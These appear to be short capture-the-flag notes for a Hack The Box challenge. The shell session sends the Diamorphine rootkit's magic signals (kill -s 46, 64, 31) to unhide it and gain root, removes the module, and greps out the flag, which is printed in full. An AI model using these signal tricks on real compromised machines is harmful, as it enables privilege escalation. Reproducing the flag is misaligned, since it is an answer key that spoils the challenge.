'''
https://www.ctfiot.com/70400.html
https://github.com/m0nad/Diamorphine

~ $ kill -s 46 1
kill -s 46 1
~ $ lsmod
lsmod
diamorphine 16384 0 - Live 0x0000000000000000 (OE)
~ $ kill -s 64 1
kill -s 64 1
~ # id
id
uid=0(root) gid=0(root) groups=1000
~ # kill -s 31 1
kill -s 31 1
~ # ls /root
ls /root
~ # rmmod diamorphine
rmmod diamorphine

~ # grep HTB -r etc home opt root tmp usr var
grep HTB -r etc home opt root tmp usr var
opt/psychosis/flag.txt:HTB{N0w_Y0u_C4n_S33_m3_4nd_th3_r00tk1t_h4s_b33n_sUcc3ssfully_d3f34t3d!!}
'''
